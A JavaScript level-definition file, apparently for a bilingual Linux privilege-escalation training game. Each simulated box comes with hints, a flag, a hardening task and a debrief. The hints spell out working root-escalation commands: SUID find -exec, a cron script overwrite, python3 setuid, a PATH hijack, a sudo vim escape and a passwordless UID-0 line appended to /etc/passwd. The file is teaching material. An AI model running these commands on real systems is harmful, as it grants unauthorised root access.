// 5 privesc machines — each independent, one distinct vulnerability
window.LEVELS = [
    // ─────────────────────────────────────────────────────────────
    // LEVEL 1 — SUID misconfiguration on /usr/bin/find
    // ─────────────────────────────────────────────────────────────
    {
        id: 1,
        codename: 'box-01',
        title: { en: 'Box-01 · SUID Bit Bandit', fr: 'Box-01 · Le voleur de bit SUID' },
        brief: {
            en: "You landed a shell as low-priv user 'player'. Some binary owned by root has SUID set and shouldn't. Find it, abuse it.",
            fr: "Tu as un shell en tant que 'player'. Un binaire root possède un SUID qui ne devrait pas être là. Trouve-le et exploite-le."
        },
        user: 'player',
        host: 'box-01',
        cwd: '/home/player',
        objectives: {
            en: ['Enumerate SUID binaries', 'Identify the vulnerable one', 'Get a root shell'],
            fr: ['Énumérer les binaires SUID', 'Identifier le binaire vulnérable', 'Obtenir un shell root']
        },
        hints: {
            en: [
                'SUID binaries have the "s" bit. Try: find / -perm -4000 2>/dev/null',
                '/usr/bin/find with SUID root is dangerous. Check GTFOBins for "find".',
                'find can execute commands. Try: find . -exec /bin/sh -p \\;'
            ],
            fr: [
                'Les binaires SUID ont le bit "s". Essaie : find / -perm -4000 2>/dev/null',
                '/usr/bin/find avec SUID root est dangereux. Regarde GTFOBins pour "find".',
                'find peut exécuter des commandes. Essaie : find . -exec /bin/sh -p \\;'
            ]
        },
        flag: 'flag{suid_find_pwn3d}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc — nothing interesting here\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'TODO:\n- audit SUID bins on this box\n- report to secteam\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{suid_find_pwn3d}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['find', 'ls', 'cat', 'sh', 'bash'] },
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        // Declared win condition — checked at runtime by CMD.winConditionMet()
        // before any spawnShell(true, {type}) call is allowed to grant root.
        wins: [
            { type: 'suid_shell_via', binary: '/usr/bin/find' }
        ],
        harden: {
            type: 'unset_suid', target: '/usr/bin/find',
            obj: { en: 'Remove the SUID bit from /usr/bin/find', fr: 'Retire le bit SUID de /usr/bin/find' },
            hint: { en: 'chmod u-s /usr/bin/find', fr: 'chmod u-s /usr/bin/find' }
        },
        debrief: {
            en: {
                vuln: 'SUID misconfiguration (find)',
                why: '/usr/bin/find had the SUID bit set as root. GTFOBins lists find among binaries that can spawn a shell via -exec, so any user running it inherits root privileges instead of just listing files.',
                fix: 'Remove the SUID bit unless strictly required (chmod u-s /usr/bin/find), and audit SUID binaries regularly with find / -perm -4000. Never grant SUID to general-purpose tools that can execute arbitrary commands.',
                link: 'https://gtfobins.github.io/gtfobins/find/'
            },
            fr: {
                vuln: 'Mauvaise config SUID (find)',
                why: '/usr/bin/find avait le bit SUID posé en root. GTFOBins liste find parmi les binaires capables d\'ouvrir un shell via -exec : n\'importe quel utilisateur qui l\'exécute hérite des droits root au lieu de simplement lister des fichiers.',
                fix: 'Retire le bit SUID sauf nécessité stricte (chmod u-s /usr/bin/find), et audite régulièrement les binaires SUID avec find / -perm -4000. Ne jamais donner le SUID à un outil généraliste capable d\'exécuter des commandes arbitraires.',
                link: 'https://gtfobins.github.io/gtfobins/find/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 2 — Writable cron script running as root
    // ─────────────────────────────────────────────────────────────
    {
        id: 2,
        codename: 'box-02',
        title: { en: 'Box-02 · The Cron Whisperer', fr: 'Box-02 · Le chuchoteur de cron' },
        brief: {
            en: 'A scheduled job runs every minute as root. Somewhere a script it executes is world-writable. Hijack the payload.',
            fr: 'Un job planifié tourne toutes les minutes en root. Un script qu\'il exécute est accessible en écriture pour tous. Détourne le payload.'
        },
        user: 'player',
        host: 'box-02',
        cwd: '/home/player',
        objectives: {
            en: ['Read /etc/crontab', 'Find a writable script called by root', 'Overwrite it and wait for cron'],
            fr: ['Lire /etc/crontab', 'Trouver un script accessible en écriture appelé par root', 'Réécrire ce script et attendre cron']
        },
        hints: {
            en: [
                'cat /etc/crontab shows system-wide jobs.',
                '/opt/backup.sh runs as root every minute. Check its permissions: ls -la /opt/backup.sh',
                'Overwrite the script: echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh — then type "wait".'
            ],
            fr: [
                'cat /etc/crontab affiche les jobs système.',
                '/opt/backup.sh tourne en root chaque minute. Vérifie ses permissions : ls -la /opt/backup.sh',
                'Réécris le script : echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh — puis tape "wait".'
            ]
        },
        flag: 'flag{cr0n_writable_l00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'crontab'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/crontab': { type: 'file', owner: 'root', mode: '644', content:
`# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# m h dom mon dow user  command
*  *  *   *   *  root  /opt/backup.sh
17 *  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
` },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cr0n_writable_l00t}\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['backup.sh'] },
            '/opt/backup.sh': { type: 'file', owner: 'root', mode: '777', writable_by_all: true, content:
`#!/bin/sh
# Nightly backup helper
echo "backup at $(date)" >> /var/log/backup.log
` },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['log'] },
            '/var/log': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'cron_hijack', path: '/opt/backup.sh' }
        ],
        harden: {
            type: 'lock_perms', target: '/opt/backup.sh',
            obj: { en: 'Make /opt/backup.sh no longer world-writable', fr: 'Rends /opt/backup.sh non modifiable par tous' },
            hint: { en: 'chmod 700 /opt/backup.sh', fr: 'chmod 700 /opt/backup.sh' }
        },
        debrief: {
            en: {
                vuln: 'World-writable cron script',
                why: "root's crontab runs /opt/backup.sh every minute, but the script itself is writable by any user (mode 777). Overwriting it lets an attacker execute arbitrary code with root's privileges the next time cron fires.",
                fix: 'Scripts run by root must never be group- or world-writable. Set correct ownership and permissions (chmod 700, chown root:root) on any file referenced by a privileged cron job, and regularly audit /etc/crontab and cron.d entries for what they call.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: 'Script cron accessible en écriture pour tous',
                why: "Le crontab root exécute /opt/backup.sh chaque minute, mais le script lui-même est accessible en écriture par n'importe quel utilisateur (mode 777). L'écraser permet d'exécuter du code arbitraire avec les droits root au prochain déclenchement de cron.",
                fix: "Un script exécuté par root ne doit jamais être accessible en écriture au groupe ou à tous. Fixe les bons propriétaire/permissions (chmod 700, chown root:root) sur tout fichier appelé par un job cron privilégié, et audite régulièrement /etc/crontab et cron.d.",
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 3 — Linux capabilities (cap_setuid on python3)
    // ─────────────────────────────────────────────────────────────
    {
        id: 3,
        codename: 'box-03',
        title: { en: 'Box-03 · Capable of Everything', fr: 'Box-03 · Capable de tout' },
        brief: {
            en: 'Traditional SUID audit shows nothing juicy. But capabilities are another attack surface — inspect them.',
            fr: 'L\'audit SUID classique ne donne rien. Mais les capabilities sont une autre surface d\'attaque — inspecte-les.'
        },
        user: 'player',
        host: 'box-03',
        cwd: '/home/player',
        objectives: {
            en: ['List capabilities on the system', 'Identify the risky binary', 'Abuse it to setuid(0)'],
            fr: ['Lister les capabilities du système', 'Identifier le binaire à risque', 'L\'exploiter pour setuid(0)']
        },
        hints: {
            en: [
                'Try: getcap -r / 2>/dev/null',
                'python3 with cap_setuid+ep lets you change UID to 0.',
                'Payload: python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\''
            ],
            fr: [
                'Essaie : getcap -r / 2>/dev/null',
                'python3 avec cap_setuid+ep te permet de passer UID à 0.',
                'Payload : python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\''
            ]
        },
        flag: 'flag{c4p_setuid_ftw}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'HINT.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'SUID search returned nothing.\nHave you looked at Linux capabilities?\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{c4p_setuid_ftw}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['python3', 'ls', 'cat', 'sh', 'bash', 'getcap', 'setcap'] },
            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', capabilities: 'cap_setuid+ep', content: 'ELF binary' },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/getcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/setcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'python_setuid' }
        ],
        harden: {
            type: 'unset_cap', target: '/usr/bin/python3',
            obj: { en: 'Strip the cap_setuid capability from python3', fr: 'Retire la capability cap_setuid de python3' },
            hint: { en: 'setcap -r /usr/bin/python3', fr: 'setcap -r /usr/bin/python3' }
        },
        debrief: {
            en: {
                vuln: 'Linux capability cap_setuid+ep on python3',
                why: 'Linux capabilities grant a binary partial root powers without full SUID. python3 was granted cap_setuid, so it can call setuid(0) directly from a script and spawn a root shell — bypassing regular permission checks entirely.',
                fix: 'Remove unnecessary capabilities with setcap -r /usr/bin/python3, and treat cap_setuid/cap_setgid on interpreters (python, perl, ruby, node) as equivalent to full SUID root. Audit with getcap -r / regularly.',
                link: 'https://gtfobins.github.io/gtfobins/python3/'
            },
            fr: {
                vuln: 'Capability Linux cap_setuid+ep sur python3',
                why: 'Les capabilities Linux donnent à un binaire des pouvoirs root partiels sans SUID complet. python3 avait cap_setuid : il peut appeler setuid(0) directement depuis un script et ouvrir un shell root, en contournant totalement les vérifications de permissions classiques.',
                fix: 'Retire les capabilities inutiles avec setcap -r /usr/bin/python3, et traite cap_setuid/cap_setgid sur un interpréteur (python, perl, ruby, node) comme un SUID root complet. Audite régulièrement avec getcap -r /.',
                link: 'https://gtfobins.github.io/gtfobins/python3/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 4 — PATH hijacking against SUID binary
    // ─────────────────────────────────────────────────────────────
    {
        id: 4,
        codename: 'box-04',
        title: { en: 'Box-04 · PATH of Least Resistance', fr: 'Box-04 · Le chemin de moindre résistance' },
        brief: {
            en: 'A SUID helper /usr/local/bin/status calls an external command without an absolute path. Rewrite the PATH.',
            fr: 'Un helper SUID /usr/local/bin/status appelle une commande externe sans chemin absolu. Réécris le PATH.'
        },
        user: 'player',
        host: 'box-04',
        cwd: '/home/player',
        objectives: {
            en: ['Find SUID binaries', 'Analyze what /usr/local/bin/status calls', 'Hijack the PATH to run your own binary'],
            fr: ['Trouver les binaires SUID', 'Analyser ce qu\'appelle /usr/local/bin/status', 'Détourner le PATH avec ton propre binaire']
        },
        hints: {
            en: [
                'Try: find / -perm -4000 2>/dev/null and then strings /usr/local/bin/status',
                '/usr/local/bin/status calls "ps" without absolute path.',
                'Payload:\n  echo \'#!/bin/sh\' > /tmp/ps\n  echo \'/bin/sh\' >> /tmp/ps\n  chmod +x /tmp/ps\n  export PATH=/tmp:$PATH\n  /usr/local/bin/status'
            ],
            fr: [
                'Essaie : find / -perm -4000 2>/dev/null puis strings /usr/local/bin/status',
                '/usr/local/bin/status appelle "ps" sans chemin absolu.',
                'Payload :\n  echo \'#!/bin/sh\' > /tmp/ps\n  echo \'/bin/sh\' >> /tmp/ps\n  chmod +x /tmp/ps\n  export PATH=/tmp:$PATH\n  /usr/local/bin/status'
            ]
        },
        flag: 'flag{path_h1jack3d}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{path_h1jack3d}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'local'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'find', 'strings', 'ps'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/strings': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/ps': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/local': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/local/bin': { type: 'dir', owner: 'root', mode: '755', children: ['status'] },
            '/usr/local/bin/status': { type: 'file', owner: 'root', mode: '4755', suid: true, content:
`ELF binary (system status helper)
Embedded strings:
  === status v1.2 ===
  System status:
  system(ps -eo user,pid,cmd);
  system("ps");
`, calls_unqualified: 'ps' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'path_hijack', target: '/usr/local/bin/status', hijack_cmd: 'ps' }
        ],
        harden: {
            type: 'unset_suid', target: '/usr/local/bin/status',
            obj: { en: 'Remove the SUID bit from /usr/local/bin/status', fr: 'Retire le bit SUID de /usr/local/bin/status' },
            hint: { en: 'chmod u-s /usr/local/bin/status', fr: 'chmod u-s /usr/local/bin/status' }
        },
        debrief: {
            en: {
                vuln: 'PATH hijack against a SUID helper',
                why: '/usr/local/bin/status is SUID root but calls "ps" without an absolute path. The program trusts the PATH environment variable, so placing a malicious "ps" earlier in PATH makes the SUID binary execute attacker-controlled code as root.',
                fix: 'Never call external commands by relative name from privileged code — always use absolute paths (/bin/ps). Drop or sanitize PATH before executing anything as root, and inspect SUID binaries with strings to spot unqualified command calls.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: 'Détournement de PATH contre un helper SUID',
                why: '/usr/local/bin/status est SUID root mais appelle "ps" sans chemin absolu. Le programme fait confiance à la variable PATH : placer un faux "ps" plus tôt dans le PATH fait exécuter du code contrôlé par l\'attaquant, avec les droits root.',
                fix: 'Ne jamais appeler une commande externe par son nom relatif depuis du code privilégié — toujours utiliser un chemin absolu (/bin/ps). Nettoie ou fige le PATH avant d\'exécuter quoi que ce soit en root, et inspecte les binaires SUID avec strings pour repérer les appels non qualifiés.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 5 — Sudoers misconfig: NOPASSWD on vim
    // ─────────────────────────────────────────────────────────────
    {
        id: 5,
        codename: 'box-05',
        title: { en: 'Box-05 · Sudo, But Too Much', fr: 'Box-05 · Sudo, un peu trop généreux' },
        brief: {
            en: 'The sysadmin gave you sudo access to a text editor. Editors that shell out are your best friend.',
            fr: "L'admin t'a donné sudo sur un éditeur de texte. Les éditeurs qui lancent un shell sont tes meilleurs amis."
        },
        user: 'player',
        host: 'box-05',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Identify the abusable command', 'Escape to a root shell via the editor'],
            fr: ['Vérifier tes droits sudo', 'Identifier la commande exploitable', 'Sortir en root via l\'éditeur']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'You can run /usr/bin/vim as root with NOPASSWD. Vim can spawn shells.',
                'Payload: sudo vim -c \':!/bin/sh\''
            ],
            fr: [
                'Essaie : sudo -l',
                'Tu peux lancer /usr/bin/vim en root sans mot de passe. Vim peut ouvrir un shell.',
                'Payload : sudo vim -c \':!/bin/sh\''
            ]
        },
        flag: 'flag{sud0_v1m_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_v1m_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'vim'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/vim': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            // sudo -l output for player
            player: [
                { cmd: '/usr/bin/vim', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_vim_escape' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on vim',
                why: "The sudoers file lets 'player' run /usr/bin/vim as root without a password. Vim can execute shell commands (:! or :!sh), which inherit vim's elevated privileges — an instant root shell.",
                fix: 'Never grant sudo on general-purpose editors, interpreters, or pagers listed on GTFOBins. If an editor must run as root, restrict it (e.g. rvim, sudoedit) or wrap it so shelling out is disabled.',
                link: 'https://gtfobins.github.io/gtfobins/vim/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur vim',
                why: "Le fichier sudoers autorise 'player' à lancer /usr/bin/vim en root sans mot de passe. Vim peut exécuter des commandes shell (:! ou :!sh), qui héritent des privilèges de vim — un shell root immédiat.",
                fix: 'Ne jamais donner de sudo sur un éditeur, interpréteur ou pager généraliste listé sur GTFOBins. Si un éditeur doit tourner en root, restreins-le (ex. rvim, sudoedit) ou bloque la sortie shell.',
                link: 'https://gtfobins.github.io/gtfobins/vim/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 6 — World-writable /etc/passwd
    // ─────────────────────────────────────────────────────────────
    {
        id: 6,
        codename: 'box-06',
        title: { en: 'Box-06 · Passwd the Parcel', fr: 'Box-06 · Le passwd de la discorde' },
        brief: {
            en: '/etc/passwd should never be writable by users. On this box, it is. Add yourself a root.',
            fr: '/etc/passwd ne devrait jamais être modifiable par les utilisateurs. Ici, il l\'est. Ajoute-toi un root.'
        },
        user: 'player',
        host: 'box-06',
        cwd: '/home/player',
        objectives: {
            en: ['Check /etc/passwd permissions', 'Append a UID-0 account with no password', 'Switch to it'],
            fr: ['Vérifier les permissions de /etc/passwd', 'Ajouter un compte UID 0 sans mot de passe', 'Basculer dessus']
        },
        hints: {
            en: [
                'ls -la /etc/passwd — is it writable? A password field left empty means "no password".',
                'A line with an empty second field and UID 0 is a passwordless root: name::0:0::/root:/bin/bash',
                'echo \'r00t::0:0:pwned:/root:/bin/bash\' >> /etc/passwd  then  su r00t'
            ],
            fr: [
                'ls -la /etc/passwd — modifiable ? Un 2e champ vide = "pas de mot de passe".',
                'Une ligne au 2e champ vide et UID 0 est un root sans mot de passe : nom::0:0::/root:/bin/bash',
                'echo \'r00t::0:0:pwned:/root:/bin/bash\' >> /etc/passwd  puis  su r00t'
            ]
        },
        flag: 'flag{writ4ble_passwd_r00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'Migration in progress — perms on /etc were loosened "temporarily".\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '666', writable_by_all: true, content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{writ4ble_passwd_r00t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'su', 'openssl'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/su': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/openssl': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'passwd_write' }
        ],
        harden: {
            type: 'lock_perms', target: '/etc/passwd',
            obj: { en: 'Restore safe permissions on /etc/passwd (644)', fr: 'Restaure des permissions sûres sur /etc/passwd (644)' },
            hint: { en: 'chmod 644 /etc/passwd', fr: 'chmod 644 /etc/passwd' }
        },
        debrief: {
            en: {
                vuln: 'World-writable /etc/passwd',
                why: '/etc/passwd was mode 666, so any user could append their own account. A line with an empty password field and UID 0 is a passwordless root account — su into it and you are root, no cracking required.',
                fix: '/etc/passwd must be 644 and owned by root. Never loosen its permissions. Passwords belong in /etc/shadow (640, root:shadow); an empty password field in passwd is a critical misconfiguration.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd'
            },
            fr: {
                vuln: '/etc/passwd modifiable par tous',
                why: '/etc/passwd était en 666 : n\'importe qui pouvait y ajouter un compte. Une ligne au champ mot de passe vide et UID 0 est un root sans mot de passe — un su suffit pour devenir root, sans rien casser.',
                fix: '/etc/passwd doit être en 644, propriété de root. Ne jamais assouplir ses droits. Les mots de passe vont dans /etc/shadow (640, root:shadow) ; un champ mot de passe vide dans passwd est une faille critique.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 7 — Sudoers misconfig: NOPASSWD on awk (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 7,
        codename: 'box-07',
        title: { en: 'Box-07 · Awk-ward Privileges', fr: 'Box-07 · Des privilèges Awk-ward' },
        brief: {
            en: 'sudo lets you run a text-processing tool as root. Many of them can shell out. Find the one you have.',
            fr: 'sudo t\'autorise un outil de traitement de texte en root. Beaucoup peuvent ouvrir un shell. Trouve le tien.'
        },
        user: 'player',
        host: 'box-07',
        cwd: '/home/player',
        objectives: {
